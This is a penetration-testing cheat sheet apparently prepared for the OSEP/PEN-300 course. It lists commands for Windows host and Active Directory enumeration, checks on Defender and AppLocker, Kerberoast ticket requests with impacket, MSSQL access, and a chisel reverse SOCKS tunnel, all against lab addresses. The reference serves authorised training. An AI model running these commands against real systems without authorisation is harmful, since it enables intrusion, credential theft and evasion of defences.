---
title: OSEP
---

# OSEP

## Variables

```bash
export CASE='target01'
mkdir -p "$CASE"/{recon,loot,src,bin}
```

## Ports

| Port | Protocol | Service |
| --- | --- | --- |
| 53 | TCP/UDP | DNS |
| 88 | TCP/UDP | Kerberos |
| 135 | TCP | RPC |
| 389, 636 | TCP | LDAP/S |
| 445 | TCP | SMB |
| 1433 | TCP | MSSQL |
| 3389 | TCP | RDP |
| 5985, 5986 | TCP | WinRM |

## Session

```bash
script -af "$CASE/terminal.log"
```

```powershell
hostname; whoami /all
$ExecutionContext.SessionState.LanguageMode
$PSVersionTable
```

## Build

```bash
dotnet new console -n Runner
dotnet build Runner -c Release
file Runner/bin/Release/*/Runner.dll

x86_64-w64-mingw32-gcc runner.c -o runner.exe -O2
```

```powershell
[Environment]::Is64BitProcess
[Environment]::Is64BitOperatingSystem

$cmd = 'Write-Output "lab test"'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

## Controls

```powershell
Get-MpComputerStatus
Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatName,Resources

Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

$env:PATH -split ';'
Get-Acl $env:TEMP, 'C:\Windows\Tasks' | Format-List
```

```cmd
sc query appidsvc
dir C:\Windows\System32\CodeIntegrity
```

Record architecture, parent process, policy result, and detection time for each execution failure.

## Host context

```powershell
quser
whoami /priv
cmdkey /list

Get-ChildItem C:\Users -Include *.ps1,*.bat,*.cmd,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue
```

```cmd
wmic service get Name,StartName,PathName,StartMode
schtasks /query /fo LIST /v
```

## Active Directory

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
nltest /dclist:$env:USERDNSDOMAIN

setspn -Q */*
Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation | Select Name,TrustedForDelegation,TrustedToAuthForDelegation

klist
```

```bash
nxc smb targets.txt -u analyst -p 'PASSWORD' --shares
nxc smb targets.txt -u analyst -p 'PASSWORD' --sessions

impacket-GetUserSPNs -request -dc-ip 192.0.2.20 LAB.LOCAL/analyst:'PASSWORD'
```

## MSSQL and network

```bash
nmap -Pn -p1433 --script ms-sql-info 192.0.2.0/24
impacket-mssqlclient 'LAB/analyst:PASSWORD@192.0.2.30' -windows-auth
```

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;
SELECT name FROM sys.databases;
```

```powershell
Get-NetFirewallProfile
Get-NetFirewallRule -Enabled True | Select-Object DisplayName,Direction,Action
Get-NetTCPConnection -State Listen
```

```bash
./chisel server --reverse --port 8080

./chisel client 192.0.2.10:8080 R:socks
```

## References

- [PEN-300 course](https://www.offsec.com/courses/pen-300/)
